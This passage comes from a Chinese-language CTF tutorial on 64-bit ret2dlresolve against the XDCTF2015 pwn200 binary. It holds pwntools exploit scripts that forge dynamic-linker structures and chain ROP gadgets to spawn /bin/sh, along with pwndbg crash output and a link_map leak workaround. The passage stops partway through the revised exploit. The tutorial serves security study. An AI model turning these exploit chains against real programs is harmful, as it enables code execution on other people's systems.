    <span class=n>reloc_index</span> <span class=o>=</span> <span class=p>(</span><span class=n>reloc_addr</span><span class=o>-</span><span class=n>rel_plt</span><span class=p>)</span><span class=o>/</span><span class=mi>24</span>
    <span class=n>rinfo</span> <span class=o>=</span> <span class=p>(</span><span class=n>symbol_index</span><span class=o>&lt;&lt;</span><span class=mi>32</span><span class=p>)</span> <span class=o>|</span> <span class=mi>7</span>
    <span class=n>write_reloc</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>resolve_addr</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>rinfo</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>pad</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=n>write_reloc</span>

    <span class=n>resolve_call</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>plt0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>reloc_index</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>resolve_data</span><span class=p>,</span> <span class=n>resolve_call</span>


<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>

<span class=n>store_addr</span> <span class=o>=</span> <span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x100</span>

<span class=c1># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span><span class=o>+</span><span class=mi>8</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>resolve_data</span><span class=p>,</span> <span class=n>resolve_call</span> <span class=o>=</span> <span class=n>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=s2>&quot;system&quot;</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;write&quot;</span><span class=p>])</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>store_addr</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)))</span>  
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=c1># send resolve data</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>

<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span>
<span class=n>bin_sh_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>bin_sh_addr</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>sh</span><span class=p>)))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>sh</span><span class=p>)</span>


<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x00000000004007a3</span><span class=p>)</span> <span class=c1># 0x00000000004007a3: pop rdi; ret; </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>resolve_call</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>然而， 简单地运行后发现，程序崩溃了。</p> <div class=highlight><pre><span></span><code>─────────────────────────────────[ REGISTERS ]──────────────────────────────────
*RAX  0x4003f6 ◂— 0x2000200020000
*RBX  0x601018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x7fe00aa8e250 (write) ◂— lea    rax, [rip + 0x2e06a1]
*RCX  0x155f100000007
*RDX  0x155f1
*RDI  0x400398 ◂— 0x6f732e6362696c00
*RSI  0x601158 ◂— 0x1200200db8
*R8   0x0
 R9   0x7fe00af7a4c0 ◂— 0x7fe00af7a4c0
*R10  0x7fe00af98170 ◂— 0x0
 R11  0x246
*R12  0x6161616161616161 (&#39;aaaaaaaa&#39;)
*R13  0x6161616161616161 (&#39;aaaaaaaa&#39;)
*R14  0x6161616161616161 (&#39;aaaaaaaa&#39;)
*R15  0x6161616161616161 (&#39;aaaaaaaa&#39;)
*RBP  0x6161616161616161 (&#39;aaaaaaaa&#39;)
*RSP  0x7fffb43c82a0 ◂— 0x0
*RIP  0x7fe00ad7eeb4 (_dl_fixup+116) ◂— movzx  eax, word ptr [rax + rdx*2]
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x7fe00ad7eeb4 &lt;_dl_fixup+116&gt;    movzx  eax, word ptr [rax + rdx*2]
   0x7fe00ad7eeb8 &lt;_dl_fixup+120&gt;    and    eax, 0x7fff
   0x7fe00ad7eebd &lt;_dl_fixup+125&gt;    lea    rdx, [rax + rax*2]
   0x7fe00ad7eec1 &lt;_dl_fixup+129&gt;    mov    rax, qword ptr [r10 + 0x2e0]
   0x7fe00ad7eec8 &lt;_dl_fixup+136&gt;    lea    r8, [rax + rdx*8]
   0x7fe00ad7eecc &lt;_dl_fixup+140&gt;    mov    eax, 0
   0x7fe00ad7eed1 &lt;_dl_fixup+145&gt;    mov    r9d, dword ptr [r8 + 8]
   0x7fe00ad7eed5 &lt;_dl_fixup+149&gt;    test   r9d, r9d
   0x7fe00ad7eed8 &lt;_dl_fixup+152&gt;    cmove  r8, rax
   0x7fe00ad7eedc &lt;_dl_fixup+156&gt;    mov    edx, dword ptr fs:[0x18]
   0x7fe00ad7eee4 &lt;_dl_fixup+164&gt;    test   edx, edx
</code></pre></div> <p>通过调试，我们发现，程序是在获取对应的版本号</p> <ul> <li>rax 为 0x4003f6，指向版本号数组</li> <li>rdx 为 0x155f1，符号表索引，同时为版本号索引</li> </ul> <p>同时 rax + rdx*2 为 0x42afd8，而这个地址并不在映射的内存中。</p> <div class=highlight><pre><span></span><code>pwndbg&gt; print /x $rax + $rdx*2
$1 = 0x42afd8
pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64
          0x600000           0x601000 r--p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64
          0x601000           0x602000 rw-p     1000 1000   /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64
    0x7fe00a97e000     0x7fe00ab65000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ab65000     0x7fe00ad65000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ad65000     0x7fe00ad69000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ad69000     0x7fe00ad6b000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ad6b000     0x7fe00ad6f000 rw-p     4000 0      
    0x7fe00ad6f000     0x7fe00ad96000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe00af79000     0x7fe00af7b000 rw-p     2000 0      
    0x7fe00af96000     0x7fe00af97000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe00af97000     0x7fe00af98000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe00af98000     0x7fe00af99000 rw-p     1000 0      
    0x7fffb43a9000     0x7fffb43cb000 rw-p    22000 0      [stack]
    0x7fffb43fb000     0x7fffb43fe000 r--p     3000 0      [vvar]
    0x7fffb43fe000     0x7fffb4400000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
</code></pre></div> <p>那我们能不能想办法让它位于映射的内存中呢。估计有点难</p> <ul> <li>bss 的起始地址为 0x601050，那么索引值最小为 (0x601050-0x400398)/24=87517，即 0x4003f6 + 87517*2 = 0x42afb0</li> <li>bss 可以最大使用的地址为 0x601fff，对应的索引值为(0x601fff-0x400398)/24=87684，即0x4003f6 + 87684*2 = 0x42b0fe</li> </ul> <p>显然都在非映射的内存区域。因此，我们得考虑考虑其它办法。通过阅读 dl_fixup 的代码</p> <div class=highlight><pre><span></span><code>        <span class=c1>// 获取符号的版本信息</span>
        <span class=k>const</span> <span class=k>struct</span> <span class=nc>r_found_version</span> <span class=o>*</span><span class=n>version</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_info</span><span class=p>[</span><span class=n>VERSYMIDX</span><span class=p>(</span><span class=n>DT_VERSYM</span><span class=p>)]</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span>
        <span class=p>{</span>
            <span class=k>const</span> <span class=nf>ElfW</span><span class=p>(</span><span class=n>Half</span><span class=p>)</span> <span class=o>*</span><span class=n>vernum</span> <span class=o>=</span> <span class=p>(</span><span class=k>const</span> <span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>D_PTR</span><span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>l_info</span><span class=p>[</span><span class=n>VERSYMIDX</span><span class=p>(</span><span class=n>DT_VERSYM</span><span class=p>)]);</span>
            <span class=n>ElfW</span><span class=p>(</span><span class=n>Half</span><span class=p>)</span> <span class=n>ndx</span> <span class=o>=</span> <span class=n>vernum</span><span class=p>[</span><span class=n>ELFW</span><span class=p>(</span><span class=n>R_SYM</span><span class=p>)(</span><span class=n>reloc</span><span class=o>-&gt;</span><span class=n>r_info</span><span class=p>)]</span> <span class=o>&amp;</span> <span class=mh>0x7fff</span><span class=p>;</span>
            <span class=n>version</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_versions</span><span class=p>[</span><span class=n>ndx</span><span class=p>];</span>
            <span class=k>if</span> <span class=p>(</span><span class=n>version</span><span class=o>-&gt;</span><span class=n>hash</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
                <span class=n>version</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
        <span class=p>}</span>
</code></pre></div> <p>我们发现，如果把 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 设置为 NULL，那程序就不会执行下面的代码，版本号就为 NULL，就可以正常执行代码。但是，这样的话，我们就需要知道 link_map 的地址了。 GOT 表的第 0 项（本例中 0x601008）存储的就是 link_map 的地址。</p> <p>因此，我们可以</p> <ul> <li>泄露该处的地址</li> <li>将 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 设置为 NULL</li> <li>最后执行利用脚本即可</li> </ul> <p>通过汇编代码，我们可以看出 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 的偏移为 0x1c8</p> <div class=highlight><pre><span></span><code> ► 0x7fa4b09f7ea1 &lt;_dl_fixup+97&gt;     mov    rax, qword ptr [r10 + 0x1c8]
   0x7fa4b09f7ea8 &lt;_dl_fixup+104&gt;    xor    r8d, r8d
   0x7fa4b09f7eab &lt;_dl_fixup+107&gt;    test   rax, rax
   0x7fa4b09f7eae &lt;_dl_fixup+110&gt;    je     _dl_fixup+156 &lt;_dl_fixup+156&gt;
</code></pre></div> <p>因此，我们可以简单修改下 exp。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>

<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
<span class=n>csu_front_addr</span> <span class=o>=</span> <span class=mh>0x400780</span>
<span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40079A</span>
<span class=n>vuln_addr</span> <span class=o>=</span> <span class=mh>0x400637</span>

<span class=k>def</span> <span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
    <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class=c1># rbx = 0</span>
    <span class=c1># rbp = 1, enable not to jump</span>
    <span class=c1># r12 should be the function that you want to call</span>
    <span class=c1># rdi = edi = r13d</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdx = r15</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r13</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_front_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
    <span class=k>return</span> <span class=n>payload</span>


<span class=k>def</span> <span class=nf>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=n>func_name</span><span class=p>,</span> <span class=n>resolve_addr</span><span class=p>):</span>
    <span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

    <span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rela.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
    <span class=n>relaent</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>dynamic_value_by_tag</span><span class=p>(</span><span class=s2>&quot;DT_RELAENT&quot;</span><span class=p>)</span> <span class=c1># reloc entry size</span>

    <span class=n>dynsym</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynsym&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
    <span class=n>syment</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>dynamic_value_by_tag</span><span class=p>(</span><span class=s2>&quot;DT_SYMENT&quot;</span><span class=p>)</span> <span class=c1># symbol entry size</span>

    <span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>


    <span class=c1># construct fake function string</span>
    <span class=n>func_string_addr</span> <span class=o>=</span> <span class=n>store_addr</span>
    <span class=n>resolve_data</span> <span class=o>=</span> <span class=n>func_name</span> <span class=o>+</span> <span class=s2>&quot;</span><span class=se>\x00</span><span class=s2>&quot;</span>

    <span class=c1># construct fake symbol</span>
    <span class=n>symbol_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>
    <span class=n>offset</span> <span class=o>=</span> <span class=n>symbol_addr</span> <span class=o>-</span> <span class=n>dynsym</span>
    <span class=n>pad</span> <span class=o>=</span> <span class=n>syment</span> <span class=o>-</span> <span class=n>offset</span> <span class=o>%</span> <span class=n>syment</span> <span class=c1># align syment size</span>
    <span class=n>symbol_addr</span> <span class=o>=</span> <span class=n>symbol_addr</span><span class=o>+</span><span class=n>pad</span>
    <span class=n>symbol</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>func_string_addr</span><span class=o>-</span><span class=n>dynstr</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mh>0x12</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>symbol_index</span> <span class=o>=</span> <span class=p>(</span><span class=n>symbol_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span><span class=o>/</span><span class=mi>24</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>pad</span>
    <span class=n>resolve_data</span> <span class=o>+=</span> <span class=n>symbol</span>

    <span class=c1># construct fake reloc </span>
    <span class=n>reloc_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>
    <span class=n>offset</span> <span class=o>=</span> <span class=n>reloc_addr</span> <span class=o>-</span> <span class=n>rel_plt</span>
    <span class=n>pad</span> <span class=o>=</span> <span class=n>relaent</span> <span class=o>-</span> <span class=n>offset</span> <span class=o>%</span> <span class=n>relaent</span> <span class=c1># align relaent size</span>
    <span class=n>reloc_addr</span> <span class=o>+=</span><span class=n>pad</span>
    <span class=n>reloc_index</span> <span class=o>=</span> <span class=p>(</span><span class=n>reloc_addr</span><span class=o>-</span><span class=n>rel_plt</span><span class=p>)</span><span class=o>/</span><span class=mi>24</span>
    <span class=n>rinfo</span> <span class=o>=</span> <span class=p>(</span><span class=n>symbol_index</span><span class=o>&lt;&lt;</span><span class=mi>32</span><span class=p>)</span> <span class=o>|</span> <span class=mi>7</span>
    <span class=n>write_reloc</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>resolve_addr</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>rinfo</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>pad</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=n>write_reloc</span>

    <span class=n>resolve_call</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>plt0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>reloc_index</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>resolve_data</span><span class=p>,</span> <span class=n>resolve_call</span>


<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>

<span class=n>store_addr</span> <span class=o>=</span> <span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x100</span>

<span class=c1># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span><span class=o>+</span><span class=mi>8</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>resolve_data</span><span class=p>,</span> <span class=n>resolve_call</span> <span class=o>=</span> <span class=n>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=s2>&quot;system&quot;</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;write&quot;</span><span class=p>])</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>store_addr</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)))</span>  
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=c1># send resolve data</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>

<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span>
<span class=n>bin_sh_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>bin_sh_addr</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>sh</span><span class=p>)))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>sh</span><span class=p>)</span>


<span class=c1># leak link_map addr</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>],</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x601008</span><span class=p>,</span><span class=mi>8</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
